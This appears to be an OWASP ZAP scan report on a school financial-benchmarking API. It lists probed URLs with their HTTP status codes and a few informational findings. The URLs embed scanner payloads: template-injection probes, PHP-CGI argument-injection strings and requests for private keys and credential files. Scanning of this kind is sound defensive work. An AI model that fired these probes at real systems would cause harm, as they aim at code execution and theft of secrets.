* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=zj%257B%257B90620%257Cadd%253A89390%257D%257Dzj&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=zj%257B%257Bprint+%25226098%2522+%25228262%2522%257D%257Dzj&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=zj%257B3411*1163%257Dzj&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=zj+9729*2777+zj&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api%3Fclass.module.classLoader.DefaultAssertionStatus=nonsense
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api%3Fname=abc
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/app/etc/local.xml
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/BitKeeper
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/CHANGELOG.txt
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/composer.json
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/composer.lock
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/config/database.yml
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/config/databases.yml
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/core
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/CVS/root
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/DEADJOE
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/elmah.axd
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/favicon.ico
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/filezilla.xml
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/i.php
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/id_dsa
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/id_rsa
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/info.php
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/key.pem
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/lfm.php
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/myserver.key
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/phpinfo.php
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/privatekey.key
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/server-info
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/server-status
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/server.key
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/sftp-config.json
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/sitemanager.xml
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/sites/default/files/.ht.sqlite
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/sites/default/private/files/backup_migrate/scheduled/test.txt
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/test.php
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/trace.axd
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/vb_test.php
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/vim_settings.xml
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/WEB-INF/applicationContext.xml
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/WEB-INF/web.xml
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/winscp.ini
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/WS_FTP.ini
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net%3Faaa=bbb
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 400`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net%3Fclass.module.classLoader.DefaultAssertionStatus=nonsense
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 400`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/school
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/school/urn
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/school/urn/custom
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/school/urn/custom/identifier
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/school/urn/custom/identifier%3F-d+allow_url_include%253d1+-d+auto_prepend_file%253dphp://input
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/school/urn/custom%3F-d+allow_url_include%253d1+-d+auto_prepend_file%253dphp://input
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/school/urn/default
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/school/urn/default%3F-d+allow_url_include%253d1+-d+auto_prepend_file%253dphp://input
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/school/urn/user-defined
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/school/urn/user-defined/identifier
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/school/urn/user-defined/identifier%3F-d+allow_url_include%253d1+-d+auto_prepend_file%253dphp://input
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/school/urn/user-defined%3F-d+allow_url_include%253d1+-d+auto_prepend_file%253dphp://input
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/school/urn%3F-d+allow_url_include%253d1+-d+auto_prepend_file%253dphp://input
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/school%3F-d+allow_url_include%253d1+-d+auto_prepend_file%253dphp://input
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/trust
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/trust/companyNumber
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/trust/companyNumber/user-defined
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/trust/companyNumber/user-defined/identifier
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/trust/companyNumber/user-defined/identifier%3F-d+allow_url_include%253d1+-d+auto_prepend_file%253dphp://input
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/trust/companyNumber/user-defined%3F-d+allow_url_include%253d1+-d+auto_prepend_file%253dphp://input
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/trust/companyNumber%3F-d+allow_url_include%253d1+-d+auto_prepend_file%253dphp://input
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/trust%3F-d+allow_url_include%253d1+-d+auto_prepend_file%253dphp://input
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set%3F-d+allow_url_include%253d1+-d+auto_prepend_file%253dphp://input
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparators
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparators/schools
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparators/schools/
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparators/schools%3F-d+allow_url_include%253d1+-d+auto_prepend_file%253dphp://input
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparators/trusts
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparators/trusts/
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparators/trusts%3F-d+allow_url_include%253d1+-d+auto_prepend_file%253dphp://input
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparators%3F-d+allow_url_include%253d1+-d+auto_prepend_file%253dphp://input
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/custom-data
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/custom-data/school
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/custom-data/school/urn
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/custom-data/school/urn/identifier
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/custom-data/school/urn/identifier%3F-d+allow_url_include%253d1+-d+auto_prepend_file%253dphp://input
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/custom-data/school/urn%3F-d+allow_url_include%253d1+-d+auto_prepend_file%253dphp://input
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/custom-data/school%3F-d+allow_url_include%253d1+-d+auto_prepend_file%253dphp://input
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/custom-data%3F-d+allow_url_include%253d1+-d+auto_prepend_file%253dphp://input
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plan
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plan/urn
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plan/urn/2022
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plan/urn/2022/deployment
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plan/urn/2022/deployment%3F-d+allow_url_include%253d1+-d+auto_prepend_file%253dphp://input
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plan/urn/2022%3F-d+allow_url_include%253d1+-d+auto_prepend_file%253dphp://input
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plan/urn%3F-d+allow_url_include%253d1+-d+auto_prepend_file%253dphp://input
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plan%3F-d+allow_url_include%253d1+-d+auto_prepend_file%253dphp://input
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3F-d+allow_url_include%253d1+-d+auto_prepend_file%253dphp://input
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/health
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/health%3F-d+allow_url_include%253d1+-d+auto_prepend_file%253dphp://input
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/swagger.json
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/swagger.json%3F-d+allow_url_include%253d1+-d+auto_prepend_file%253dphp://input
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3F-d+allow_url_include%253d1+-d+auto_prepend_file%253dphp://input
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api%3F-d+allow_url_include%253d1+-d+auto_prepend_file%253dphp://input
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/school/urn/user-defined/identifier
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/school/urn/user-defined/identifier/
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/trust/companyNumber/user-defined/identifier
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/trust/companyNumber/user-defined/identifier/
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/custom-data/school/urn/identifier
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/custom-data/school/urn/identifier/
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plan/urn/2022
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plan/urn/2022/
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``

Instances: 1710

### Solution



### Reference



#### CWE Id: [ 388 ](https://cwe.mitre.org/data/definitions/388.html)


#### WASC Id: 20

#### Source ID: 4

### [ Information Disclosure - Sensitive Information in URL ](https://www.zaproxy.org/docs/alerts/10024/)



##### Informational (Medium)

### Description

The request appeared to contain sensitive information leaked in the URL. This can violate PCI and most organizational compliance policies. You can configure the list of strings for this check to add or remove values specific to your environment.

* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: `userId`
  * Attack: ``
  * Evidence: `userId`
  * Other Info: `The URL contains potentially sensitive information. The following string was found via the pattern: user
userId`

Instances: 1

### Solution

Do not pass sensitive information in URIs.

### Reference



#### CWE Id: [ 200 ](https://cwe.mitre.org/data/definitions/200.html)


#### WASC Id: 13

#### Source ID: 3

### [ Non-Storable Content ](https://www.zaproxy.org/docs/alerts/10049/)



##### Informational (Medium)

### Description

The response contents are not storable by caching components such as proxy servers. If the response does not contain sensitive, personal or user-specific information, it may benefit from being stored and cached, to improve performance.

* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/custom-data/school/urn/identifier
  * Method: `DELETE`
  * Parameter: ``
  * Attack: ``
  * Evidence: `DELETE `
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plan/urn/2022
  * Method: `DELETE`
  * Parameter: ``
  * Attack: ``
  * Evidence: `DELETE `
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/school/urn/custom/identifier
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/school/urn/default
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/custom-data/school/urn/identifier
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plan/urn/2022
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plan/urn/2022/deployment
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plans%3Furns=urns
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/custom-data/school/urn/identifier
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `PUT `
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plan/urn/2022
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `PUT `
  * Other Info: ``

Instances: 11

### Solution

The content may be marked as storable by ensuring that the following conditions are satisfied:
The request method must be understood by the cache and defined as being cacheable ("GET", "HEAD", and "POST" are currently defined as cacheable)
The response status code must be understood by the cache (one of the 1XX, 2XX, 3XX, 4XX, or 5XX response classes are generally understood)
The "no-store" cache directive must not appear in the request or response header fields
For caching by "shared" caches such as "proxy" caches, the "private" response directive must not appear in the response
For caching by "shared" caches such as "proxy" caches, the "Authorization" header field must not appear in the request, unless the response explicitly allows it (using one of the "must-revalidate", "public", or "s-maxage" Cache-Control response directives)
In addition to the conditions above, at least one of the following conditions must also be satisfied by the response:
It must contain an "Expires" header field
It must contain a "max-age" response directive
For "shared" caches such as "proxy" caches, it must contain a "s-maxage" response directive
It must contain a "Cache Control Extension" that allows it to be cached
It must have a status code that is defined as cacheable by default (200, 203, 204, 206, 300, 301, 404, 405, 410, 414, 501).

### Reference


* [ https://datatracker.ietf.org/doc/html/rfc7234 ](https://datatracker.ietf.org/doc/html/rfc7234)
* [ https://datatracker.ietf.org/doc/html/rfc7231 ](https://datatracker.ietf.org/doc/html/rfc7231)
* [ https://www.w3.org/Protocols/rfc2616/rfc2616-sec13.html ](https://www.w3.org/Protocols/rfc2616/rfc2616-sec13.html)


